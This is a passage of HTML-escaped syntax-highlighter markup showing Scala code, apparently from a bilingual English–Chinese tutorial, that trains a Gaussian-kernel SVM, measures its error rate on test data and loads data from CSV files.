&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613d1759535332-18&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                                    &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;Color&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;blue&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;Color&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;green&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613d1759535332-19&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                                &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613d1759535332-20&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;peer&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;setContentPane&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;plot&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613d1759535332-21&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613d1759535332-22&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//Here we do our SVM fine tuning with possibly different kernels&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613d1759535332-23&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//此处，我们用可能的不同核函数对SVM进行微调&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613d1759535332-24&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;svm&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-r&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;SVM&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Double&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-r&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;GaussianKernel&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0.01&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1.0&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613d1759535332-25&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;svm&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;learn&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;trainingData&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;trainingData&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613d1759535332-26&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;svm&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;finish&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613d1759535332-27&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613d1759535332-28&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//Calculate how well the SVM predicts on the training set&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613d1759535332-29&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//计算SVM对测试集的预测效果&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613d1759535332-30&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;predictions&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;testingData&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613d1759535332-31&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;_1&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613d1759535332-32&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;svm&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;predict&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613d1759535332-33&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;zip&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;testingData&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613d1759535332-34&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613d1759535332-35&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;falsePredictions&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;predictions&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613d1759535332-36&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_1&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613d1759535332-37&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613d1759535332-38&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;falsePredictions&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;sum&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;toDouble&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;predictions&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e &quot;&gt;length  &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613d1759535332-39&quot;&gt;
&lt;span class=&quot;crayon-e &quot;&gt;                    *&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot; % false predicted&quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613d1759535332-40&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613d1759535332-41&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-r&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;Dimension&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;400&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;400&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613d1759535332-42&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613d1759535332-43&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613d1759535332-44&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613d1759535332-45&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;def &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;getDataFromCSV&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;File&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Double&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Int&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613d1759535332-46&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;scala&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;Source&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;fromFile&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613d1759535332-47&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;source&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613d1759535332-48&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;getLines&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613d1759535332-49&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;drop&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613d1759535332-50&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;getDataFromString&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613d1759535332-51&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;toArray&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613d1759535332-52&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613d1759535332-53&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613d1759535332-54&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dataPoints&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613d1759535332-55&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;classifierArray&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613d1759535332-56&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dataPoints&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;classifierArray&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613d1759535332-57&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613d1759535332-58&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613d1759535332-59&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;def &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;getDataFromString&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dataString&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Double&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span 